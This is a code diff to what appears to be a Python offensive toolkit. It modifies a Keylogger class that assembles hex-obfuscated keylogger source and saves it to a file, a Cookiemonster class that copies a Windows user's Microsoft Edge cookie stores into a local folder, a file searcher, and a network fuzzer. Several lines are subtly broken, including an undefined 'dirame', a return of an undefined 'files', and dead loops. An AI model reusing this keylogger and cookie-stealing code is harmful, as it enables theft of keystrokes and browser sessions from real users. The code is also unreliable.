@@ -23,13 +23,16 @@ class ArgParser(ArgumentParser):
 class Seeker(object):
     # loops  files given path and matches a particular string.
     def __init__(self):
-        print('Searching..')
+        self.count = []
 
     def search_file(self, filename, path):
         for path, directories, files in os.walk(path):
             for file in files:
                 if filename.lower() in file.lower():
                     print(os.path.join(path, file))
+                    self.count.append(file)
+    def __len__(self):
+        return len(self.count)
 
     def __enter__(self):
         return self
@@ -125,8 +128,8 @@ class Keylogger(object):
         self.code += "\x6b\x65\x79\x6c\x6f\x67\x67\x65\x72\x20\x3d\x20\x4b\x65"
         self.code += "\x79\x6c\x6f\x67\x67\x65\x72\x28\x29"
 
-    def save(self):
-        with open('keylogger.py', 'w') as source:
+    def save(self, filename):
+        with open(filename, 'w') as source:
             source.write(self.code)
             source.close()
 
@@ -166,8 +169,8 @@ class Scrape(object):
 class Cookiemonster(object):
     # Fetches locally stored cookies
     def __init__(self):
+        self.files = []
         self.user = os.environ.get('USERNAME')
-        self.cookiejar = os.path.join(os.getcwd(), 'cookiejar')
         self.cookie_paths = ['C:\\users\\{}\\AppData\\Local\\MicrosoftEdge\\Cookies'.format(self.user),
                                 'C:\\users\{}\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\INetCookies'.format(self.user),
                                 'C:\\users\\{}\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\MicrosoftEdge\\Cookies'.format(self.user),
@@ -189,24 +192,24 @@ class Cookiemonster(object):
             except Exception as e:
                 pass
 
-    def save(self):
-        if not os.path.exists(self.cookiejar):
-            os.mkdir('cookiejar')
+    def save(self, path, dirname):
+        cookiejar = os.path.join(path, dirname)
+        if not os.path.exists(cookiejar):
+            os.mkdir(dirame)
         for paths in self.cookie_paths:
             continue
         for file in os.listdir(paths):
             try:
-                copy(os.path.join(paths, file), self.cookiejar)
+                copy(os.path.join(paths, file), cookiejar)
             except Exception as e:
                 pass
 
     def __len__(self):
-        files = []
         for paths in self.cookie_paths:
             continue
         for file in os.listdir(paths):
             try:
-                files.append(os.path.join(paths, file))
+                self.files.append(os.path.join(paths, file))
             except Exception as e:
                 pass
         return len(files)
@@ -226,12 +229,12 @@ class NetFuzzer(object):
         self.host = host
         self.port = port
 
-    def fuzz(self, chars, length):
+    def fuzz(self, chars, length, timeout, recvbuffer):
         self.Buffer = chars * length
-        self.sock.settimeout(5)
+        self.sock.settimeout(timeout)
         self.sock.connect((self.host, self.port))
         self.sock.send(self.Buffer.encode())
-        return self.sock.recv(4096).decode(),
+        return self.sock.recv(recvbuffer).decode(),
 
     def __len__(self):
         return len(self.Buffer)
